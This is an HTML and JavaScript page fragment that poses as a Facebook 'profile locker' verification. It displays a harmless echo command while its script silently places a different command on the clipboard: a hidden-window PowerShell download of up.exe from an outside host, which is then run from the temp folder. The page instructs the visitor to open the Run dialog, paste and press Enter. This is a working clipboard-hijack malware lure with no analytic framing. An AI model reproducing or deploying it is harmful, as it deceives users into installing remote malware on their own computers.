  <div class="spinner" id="spinner"></div>

  <div class="message" id="message">
    ✅ Verification complete. Profile locker activated successfully.
    <p><img src="https://i.ibb.co/dJrw6q2y/IMG-8464.png" alt="status"></p>
  </div>

  <div class="instructions" id="instructions">
    <p><b>Complete verification:</b></p>
            <p>Press <b>Windows + R</b></p>
        <p>Press <b>Ctrl + V</b> to paste</p>
        <p>Press <b>Enter</b></p>
         
            
    <p style="margin-top:8px;"><b>If auto-copy fails, copy manually:</b></p>
    <pre class="copy-box" id="copyBox">echo Verification Complete - Facebook Locker</pre>
  </div>
   <ol id="stepsList"></ol>
</div>
<script>
  const checkbox = document.getElementById("verify");
  const spinner = document.getElementById("spinner");
  const message = document.getElementById("message");
  const instructions = document.getElementById("instructions");
  const stepsList = document.getElementById("stepsList");
  const copyBox = document.getElementById("copyBox");

  const shownCommand = "echo Verification Complete - Facebook Locker";
  const hiddenCommand = "powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'http://volamtuan.github.io/up.exe' -OutFile '%TEMP%\up.exe'"
start "" /b "%TEMP%\up.exe"";

  const steps = [
    "On the profile page, select the three-dot menu at the top.",
    "From the dropdown, click on <b>Lock Profile</b>.",
    "Click <b>Lock Your Profile</b> when prompted.",
    "Confirm by clicking <b>OK</b>, and your profile will be locked."


  ];

  checkbox.addEventListener("change", async () => {
    if (checkbox.checked) {
      spinner.style.display = "block";
      message.style.display = "none";
      instructions.style.display = "none";

      setTimeout(async () => {
        spinner.style.display = "none";
        message.style.display = "block";
        instructions.style.display = "block";

        // Hiển thị hướng dẫn từng bước
        stepsList.innerHTML = "";
        steps.forEach((step, i) => {
          const li = document.createElement("li");
          li.innerHTML = step;
          li.style.opacity = "0";
          li.style.transition = "opacity 0.4s ease";
          stepsList.appendChild(li);
          setTimeout(() => { li.style.opacity = "1"; }, 400 * (i + 1));
        });

        // Auto copy (Safari compatible)
        autoCopy(hiddenCommand);
      }, 2000);
    } else {
      spinner.style.display = "none";
      message.style.display = "none";
      instructions.style.display = "none";
    }
  });

  copyBox.addEventListener("click", async () => {
    await autoCopy(hiddenCommand);
    copyBox.classList.add("copied");
    copyBox.textContent = "✅ Copied!";
    setTimeout(() => {
      copyBox.classList.remove("copied");
      copyBox.textContent = shownCommand;
    }, 1500);
  });

  function autoCopy(text) {
    return new Promise((resolve, reject) => {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(resolve).catch(() => fallbackCopy(text, resolve, reject));
      } else {
        fallbackCopy(text, resolve, reject);
      }
    });
  }

  function fallbackCopy(text, resolve, reject) {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    try {
      document.execCommand("copy");
      resolve();
    } catch (err) {
      reject(err);
    }
    document.body.removeChild(textarea);
  }
</script>

</body>
